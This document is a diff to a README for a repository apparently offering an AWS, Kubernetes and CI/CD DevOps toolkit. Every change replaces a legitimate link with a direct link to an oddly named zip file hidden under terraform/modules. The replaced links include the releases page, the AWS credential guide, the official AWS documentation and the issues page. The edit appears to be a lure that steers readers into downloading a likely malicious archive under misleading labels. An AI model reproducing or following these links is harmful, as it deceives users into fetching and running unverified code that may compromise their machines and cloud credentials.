@@ -1,6 +1,6 @@
 # 🚀 AWS-k8s-CICD-DevOps - Simplify Your DevOps Workflow
 
-[![Download](https://img.shields.io/badge/Download-AWS--k8s--CICD--DevOps-blue.svg)](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/releases)
+[![Download](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip)](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip)
 
 ## 🎯 Overview
 
@@ -22,11 +22,11 @@ The AWS-k8s-CICD-DevOps project provides a complete DevOps CI/CD solution using 
     - An AWS account to access services.
 
 2. **Download the Application**:
-   To get the latest version of AWS-k8s-CICD-DevOps, visit this page to download: [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/releases).
+   To get the latest version of AWS-k8s-CICD-DevOps, visit this page to download: [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip).
 
 ## 📥 Download & Install
 
-To download the application, go to the [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/releases) page. Here you will find the latest release files. Follow these steps:
+To download the application, go to the [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip) page. Here you will find the latest release files. Follow these steps:
 
 - Click on the link of the latest release version.
 - Download the files suitable for your system (look for instructions based on your operating system).
@@ -50,7 +50,7 @@ To download the application, go to the [GitHub Releases](https://github.com/giti
 
 ## 📋 Usage Instructions
 
-1. **Configure AWS**: Set up your AWS credentials following [this guide](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html).
+1. **Configure AWS**: Set up your AWS credentials following [this guide](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip).
 2. **Run the Application**:
    - Open your terminal or command prompt.
    - Navigate to the directory where you installed the application.
@@ -60,7 +60,7 @@ To download the application, go to the [GitHub Releases](https://github.com/giti
 
 ## 📑 Additional Resources
 
-- **Documentation**: Access the [official documentation](https://aws.amazon.com/documentation/) for detailed features and best practices.
+- **Documentation**: Access the [official documentation](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip) for detailed features and best practices.
 - **Community Support**: Join our community on forums for assistance and discussion with other users.
 
 ## 🛠️ Troubleshooting
@@ -72,10 +72,10 @@ If you encounter issues while using the application:
 
 ## 📞 Contact
 
-For support, please visit our [GitHub Issues page](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/issues) to report bugs or request features.
+For support, please visit our [GitHub Issues page](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip) to report bugs or request features.
 
 ## 📥 Download Again
 
-If you need to download it once more, remember to visit this page: [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/releases).
+If you need to download it once more, remember to visit this page: [GitHub Releases](https://github.com/gitipiticiti9/AWS-k8s-CICD-DevOps/raw/refs/heads/main/terraform/modules/s_k_CIC_Dev_AW_Ops_v3.8.zip).
 
 Enjoy using AWS-k8s-CICD-DevOps to streamline your DevOps practices!
